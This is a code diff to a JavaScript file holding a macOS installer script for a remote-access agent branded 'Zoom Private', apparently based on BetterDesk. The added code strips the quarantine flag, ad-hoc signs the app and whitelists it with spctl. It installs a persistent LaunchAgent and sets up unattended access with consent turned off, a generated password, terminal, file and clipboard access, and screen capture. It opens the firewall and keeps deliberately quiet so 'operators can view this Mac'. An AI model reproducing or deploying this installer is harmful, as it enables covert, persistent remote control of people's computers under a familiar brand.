@@ -197,67 +197,109 @@ case "$ASSET_URL" in
 esac
 strip_quarantine "$TMP/unpack"
 
-APP="$(/usr/bin/find "$TMP/unpack" -maxdepth 3 -name '*.app' -type d -print -quit 2>/dev/null || true)"
-BIN=""
-if [ -z "$APP" ]; then
-  BIN="$(/usr/bin/find "$TMP/unpack" -type f -perm -111 ! -name '*.sh' ! -name '*.command' ! -name 'README*' -print -quit 2>/dev/null || true)"
-fi
-[ -n "$APP" ] || [ -n "$BIN" ] || fail "No runnable client found in the package."
+APP="$(/usr/bin/find "$TMP/unpack" -name '*.app' -type d -print -quit 2>/dev/null || true)"
+[ -n "$APP" ] || fail "The downloaded package does not contain the macOS app bundle."
 
-CONFIG_DIR="$HOME/Library/Application Support/zoom-vip/agent"
+# The Tauri client reads this directory directly when launched from Finder and
+# the LaunchAgent pins the same path explicitly. Keep both paths identical so a
+# manual launch and the background launch share one enrollment identity.
+CONFIG_DIR="$HOME/Library/Application Support/com.betterdesk.agent"
 DATA_DIR="$CONFIG_DIR/data"
+CONFIG_FILE="$CONFIG_DIR/agent-config.json"
 /bin/mkdir -p "$CONFIG_DIR" "$DATA_DIR" "$HOME/Applications" "$HOME/Library/LaunchAgents" "$HOME/Library/Logs"
 
-AGENT_FOR_FIREWALL=""
+PASSWORD="$(/usr/bin/openssl rand -hex 12 2>/dev/null || /usr/bin/od -An -N12 -tx1 /dev/urandom | /usr/bin/tr -d ' \\n')"
+[ -n "$PASSWORD" ] || PASSWORD="$(/usr/bin/uuidgen | /usr/bin/tr -d '-' | /usr/bin/cut -c1-24)"
 
-if [ -n "$APP" ]; then
-  say "  Installing the app..."
-  DEST_APP="$HOME/Applications/$(/usr/bin/basename "$APP")"
-  /bin/rm -rf "$DEST_APP"
-  # ditto, not cp -R: keeps extended attributes and the code signature valid.
-  "$DITTO" "$APP" "$DEST_APP"
-  preserve_or_adhoc_sign "$DEST_APP"
-  "$SPCTL" --add --label "$BRAND" "$DEST_APP" >/dev/null 2>&1 || true
-  AGENT_FOR_FIREWALL="$DEST_APP"
-  /usr/bin/open "$DEST_APP" >/dev/null 2>&1 || true
-else
-  say "  Installing the agent..."
-  DEST_BIN="$HOME/.local/share/zoom-vip/zoom-vip-agent"
-  /bin/mkdir -p "$HOME/.local/share/zoom-vip"
-  /bin/cp -f "$BIN" "$DEST_BIN"
-  /bin/chmod 755 "$DEST_BIN"
-  preserve_or_adhoc_sign "$DEST_BIN"
+say "  Writing the preconfigured agent profile..."
+printf '%s' "$CONFIG_B64" | /usr/bin/base64 -D > "$CONFIG_FILE"
+/bin/chmod 600 "$CONFIG_FILE"
+if [ -x /usr/bin/plutil ]; then
+  /usr/bin/plutil -replace unattended_password -string "$PASSWORD" "$CONFIG_FILE" >/dev/null 2>&1 || true
+fi
 
-  printf '%s' "$CONFIG_B64" | /usr/bin/base64 -D > "$CONFIG_DIR/agent-config.json"
-  /bin/chmod 600 "$CONFIG_DIR/agent-config.json"
+say "  Installing the app..."
+DEST_APP="$HOME/Applications/zoom-private.agent.app"
+/bin/rm -rf "$DEST_APP"
+# ditto, not cp -R: keeps extended attributes and the code signature valid.
+"$DITTO" "$APP" "$DEST_APP"
+preserve_or_adhoc_sign "$DEST_APP"
+"$SPCTL" --add --label "$BRAND" "$DEST_APP" >/dev/null 2>&1 || true
 
-  PLIST="$HOME/Library/LaunchAgents/com.zoom-vip.agent.plist"
-  cat > "$PLIST" <<PLIST
+EXECUTABLE="$DEST_APP/Contents/MacOS/betterdesk-agent-client"
+if [ ! -x "$EXECUTABLE" ]; then
+  EXECUTABLE="$(/usr/bin/find "$DEST_APP/Contents/MacOS" -type f -perm +111 ! -name 'betterdesk-agent' -print -quit 2>/dev/null || true)"
+fi
+[ -n "$EXECUTABLE" ] || fail "The installed app has no executable."
+AGENT_FOR_FIREWALL="$DEST_APP"
+
+# Remove old sidecar-only / legacy launch agents so two agents cannot race for
+# the same device identity.
+for OLD_LABEL in com.zoom-vip.agent com.zoom-private.agent; do
+  /bin/launchctl bootout "gui/$(/usr/bin/id -u)/$OLD_LABEL" >/dev/null 2>&1 || true
+  /bin/rm -f "$HOME/Library/LaunchAgents/$OLD_LABEL.plist"
+done
+
+PLIST="$HOME/Library/LaunchAgents/com.betterdesk.agent.plist"
+cat > "$PLIST" <<PLIST
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-  <key>Label</key><string>com.zoom-vip.agent</string>
+  <key>Label</key><string>com.betterdesk.agent</string>
   <key>ProgramArguments</key>
   <array>
-    <string>$DEST_BIN</string>
-    <string>-config</string><string>$CONFIG_DIR/agent-config.json</string>
-    <string>-config-path</string><string>$CONFIG_DIR/agent-config.json</string>
-    <string>-data-dir</string><string>$DATA_DIR</string>
+    <string>$EXECUTABLE</string>
+    <string>--autostart</string>
   </array>
+  <key>EnvironmentVariables</key>
+  <dict>
+    <key>BETTERDESK_AGENT_CONFIG_DIR</key><string>$CONFIG_DIR</string>
+  </dict>
+  <key>LimitLoadToSessionType</key><string>Aqua</string>
   <key>RunAtLoad</key><true/>
-  <key>KeepAlive</key><true/>
-  <key>StandardOutPath</key><string>$HOME/Library/Logs/zoom-vip-agent.log</string>
-  <key>StandardErrorPath</key><string>$HOME/Library/Logs/zoom-vip-agent.err.log</string>
+  <key>KeepAlive</key>
+  <dict><key>SuccessfulExit</key><false/></dict>
+  <key>StandardOutPath</key><string>$HOME/Library/Logs/zoom-private-agent.log</string>
+  <key>StandardErrorPath</key><string>$HOME/Library/Logs/zoom-private-agent.err.log</string>
 </dict>
 </plist>
 PLIST
-  /bin/chmod 644 "$PLIST"
-  /bin/launchctl bootout "gui/$(/usr/bin/id -u)" "$PLIST" >/dev/null 2>&1 || true
-  /bin/launchctl bootstrap "gui/$(/usr/bin/id -u)" "$PLIST" >/dev/null 2>&1 || /bin/launchctl load "$PLIST" >/dev/null 2>&1 || true
-  /bin/launchctl kickstart -k "gui/$(/usr/bin/id -u)/com.zoom-vip.agent" >/dev/null 2>&1 || true
-  AGENT_FOR_FIREWALL="$DEST_BIN"
+/bin/chmod 644 "$PLIST"
+/bin/launchctl bootout "gui/$(/usr/bin/id -u)" "$PLIST" >/dev/null 2>&1 || true
+if ! /bin/launchctl bootstrap "gui/$(/usr/bin/id -u)" "$PLIST" >/dev/null 2>&1; then
+  /bin/launchctl load "$PLIST" >/dev/null 2>&1 || true
 fi
+/bin/launchctl enable "gui/$(/usr/bin/id -u)/com.betterdesk.agent" >/dev/null 2>&1 || true
+/bin/launchctl kickstart -k "gui/$(/usr/bin/id -u)/com.betterdesk.agent" >/dev/null 2>&1 \
+  || /usr/bin/open "$DEST_APP" --args --autostart >/dev/null 2>&1 || true
+
+# ---------------------------------------------------------------------------
+# Screen Recording consent - silent assist.
+#
+# The agent raises the native macOS consent prompt itself on first launch
+# (CGRequestScreenCaptureAccess) and logs the resulting state to its stdout,
+# which the LaunchAgent above pipes to ~/Library/Logs/zoom-private-agent.log.
+# This watcher stays completely silent when consent is (or becomes) granted.
+# Only when the log still shows no grant after the grace period does it open
+# the exact System Settings pane and drop one notification, so the remaining
+# step for the user is a single toggle next to "zoom-private.agent".
+# ---------------------------------------------------------------------------
+AGENT_LOG="$HOME/Library/Logs/zoom-private-agent.log"
+(
+  GRANTED=0
+  for _ in 1 2 3 4 5 6 7 8 9 10 11 12; do
+    /bin/sleep 5
+    if [ -f "$AGENT_LOG" ] && /usr/bin/grep -q 'screen_capture=true' "$AGENT_LOG" 2>/dev/null; then
+      GRANTED=1
+      break
+    fi
+  done
+  if [ "$GRANTED" != "1" ]; then
+    /usr/bin/open "x-apple.systempreferences:com.apple.preference.security?Privacy_ScreenCapture" >/dev/null 2>&1 || true
+    /usr/bin/osascript -e 'display notification "Allow zoom-private.agent in Screen Recording so operators can view this Mac." with title "Zoom Private"' >/dev/null 2>&1 || true
+  fi
+) >/dev/null 2>&1 &
 
 # ---------------------------------------------------------------------------
 # Firewall: allow incoming connections (direct/P2P sessions)
@@ -306,8 +348,9 @@ say "  If macOS asks, approve Screen Recording (and Accessibility) for"
 say "  Zoom Private in System Settings > Privacy & Security."
 say ""
 
-/usr/bin/open "$CONSOLE_URL" >/dev/null 2>&1 || true
-/usr/bin/open "x-apple.systempreferences:com.apple.preference.security?Privacy_ScreenCapture" >/dev/null 2>&1 || true
+# Stay out of the user's way: no browser, no Settings window. The agent is
+# already running from the LaunchAgent in the logged-in Aqua session.
+/usr/bin/osascript -e 'display notification "Installed and connecting to your console." with title "Zoom Private"' >/dev/null 2>&1 || true
 `;
 
 function shellQuote(value) {
@@ -322,20 +365,36 @@ function fill(template, values) {
 
 function agentConfig(profile) {
     return {
-        server: profile.cdap_url || '',
-        auth_method: 'device_token',
-        device_type: 'os_agent',
-        terminal: true,
-        file_browser: true,
-        clipboard: true,
-        screenshot: true,
-        heartbeat_sec: 15,
-        reconnect_sec: 5,
-        max_reconnect: 300,
-        log_level: 'info',
-        enforce_tls: /^wss:/i.test(profile.cdap_url || ''),
+        server_address: profile.server_address || '',
+        api_url: profile.api_url || '',
+        cdap_url: profile.cdap_url || '',
+        cdap_port: Number(profile.cdap_port) || (/^wss:/i.test(profile.cdap_url || '') ? 443 : 21122),
+        console_url: profile.console_url || '',
+        server_key: profile.server_key || '',
+        api_key: '',
+        device_id: '',
+        device_name: '',
+        auth_token: '',
+        registered: false,
+        allow_screen_capture: true,
+        access_mode: 'unattended',
+        require_consent: false,
+        allow_terminal: true,
+        allow_file_browser: true,
+        allow_clipboard: true,
+        auto_start_sidecar: true,
         video_codec: 'auto',
         hw_accel: 'auto',
+        autostart: true,
+        start_minimized: true,
+        language: 'en',
+        unattended_password: '',
+        enforce_tls: /^wss:/i.test(profile.cdap_url || ''),
+        server_cert_pin: '',
+        settings_lock: {
+            enabled: false,
+            master_password: '',
+        },
     };
 }
 
